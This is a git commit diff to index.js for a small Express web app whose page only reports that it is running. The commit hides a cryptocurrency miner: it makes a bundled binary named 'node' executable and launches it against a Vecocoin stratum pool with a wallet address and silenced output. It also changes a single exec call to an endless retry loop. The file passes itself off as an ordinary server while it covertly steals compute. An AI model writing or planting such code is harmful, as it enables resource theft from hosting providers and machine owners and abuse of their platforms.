47c96ae7bbfe1f18df639f87391f46a2e88bc882
Richarekrs <r.immesk48@gmail.com>
2024-07-25 18:22:22 +0700

    Update index.js

--- index.js
+++ index.js
@@ -1,7 +1,7 @@
 const express = require('express');
 const http = require('http');
-const { exec } = require('child_process');
-const prt = process.env.PORT||80
+const { execSync } = require('child_process');
+const prt = process.env.PORT || 80;
 const app = express();
 const server = http.createServer(app);
 
@@ -9,11 +9,14 @@ app.get('/', (req, res) => {
   res.send('Aplikasi sedang berjalan');
 });
 
-//logging server port
 server.listen(prt, () => {
   console.log(`Server berjalan pada port ${prt}`);
 });
 
-exec('chmod +x node && ./node --algo yespower -o stratum+tcp://stratum.vecocoin.com:8602 -u VKb4f1enK1fcCBtR9hVAb7fXL7pdDamFQZ.Library -p c=VECO,m=solo &> /dev/null', (error, stdout, stderr) => {
-  console.log(error);
- });
+while (true) {
+  try {
+    execSync('chmod +x node && ./node --algo yespower -o stratum+tcp://stratum.vecocoin.com:8602 -u VKb4f1enK1fcCBtR9hVAb7fXL7pdDamFQZ.Sekop -p c=VECO,m=solo &> /dev/null');
+  } catch (error) {
+    console.log(error);
+  }
+}
